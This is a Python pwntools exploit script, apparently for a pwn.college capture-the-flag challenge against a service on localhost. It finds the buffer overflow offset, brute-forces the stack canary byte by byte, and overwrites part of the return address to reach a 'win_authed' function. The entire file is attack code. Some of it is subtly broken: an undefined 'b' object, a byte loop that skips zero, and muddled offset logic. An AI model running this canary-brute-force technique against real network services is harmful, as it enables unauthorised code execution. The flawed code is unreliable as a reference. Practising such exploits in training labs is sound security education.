from pwn import *

offset = False
i = 0
x = 0
flag_r = re.compile(r"pwn.college{.*}")
canary = b'\x00'
# while not flag:
win = b.symbols['win_authed'] + 22
win = win & 0xffff
win = win.to_bytes(2, 'little')
while len(canary) != 8:
    for j in range(1, 0xff):
        while offset is False:
            p = remote('localhost', 1337)
            p.sendline(str(i+1))
            payload = b'A'*i + b'\x00'
            p.send(payload)
            o1 = p.recv(512).decode('utf-8', 'backslashreplace')
            p.info(o1)
            p.close()
            p = remote('localhost', 1337)
            p.sendline(str(i+1))
            payload = b'A'*(i+1)
            p.send(payload)
            o2 = p.recv(512).decode('utf-8', 'backslashreplace')
            p.info(o2)
            p.close()
            if "smashing" not in o1 and "smashing" in o2:
                offset = True
                print("Offset found: " + str(i))
                offset += 1
            else:
                print("Offset at " + str(i))
            i += 8
        p = remote('localhost', 1337)
        p.sendline(str(i + len(canary) + 1))
        payload = b'A'*i + canary + bytes([j])
        p.send(payload)
        o = p.recv(256).decode('utf-8', 'ignore')
        p.info(o)
        p.close()
        if "smashing" not in o:
            print("Found: " + hex(j).lstrip('0x').zfill(2))
            canary += bytes([j])
            print(b"Canary: " + canary)
            break
        print("Offset: " + str(i))
        print(b"Canary: " + canary)
# length = i + 18
# win = b'\xc9\x13'
payload = b'A'*i + canary + b'A'*8 + win
p = remote('localhost', 1337)
p.sendline(str(i+18))
p.send(payload)
# o = p.recvuntil('Goodbye!').decode('utf-8', 'replace')
# p.info(o)
o = p.recv(512).decode('utf-8', 'replace')
print("Win: " + win.hex())
print("Offset: " + str(i))
print(b"Canary: " + canary)
print("Payload: " + payload.hex())
p.info(o)
p.close()